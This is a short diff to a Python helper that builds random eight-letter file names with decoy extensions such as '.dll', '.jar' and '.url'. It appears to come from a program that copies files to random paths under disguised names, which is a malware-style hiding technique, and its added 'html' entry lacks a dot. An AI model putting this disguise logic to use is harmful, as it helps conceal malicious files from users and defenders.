@@ -320,7 +320,7 @@ def get_random_path():
 
 def generate_random_filename():
     random_chars = ''.join(random.choice(string.ascii_lowercase) for _ in range(8))
-    file_extensions = ['.dll', '.png', '.jpg', '.ink', '.url', '.jar', '.tmp', '.db', '.cfg', '.jpeg']
+    file_extensions = ['.dll', '.png', '.jpg', '.ink', '.url', '.jar', '.tmp', '.db', '.cfg', '.jpeg','.htm','html']
     return random_chars + random.choice(file_extensions)
 
 def create_copy_and_return_new_path():
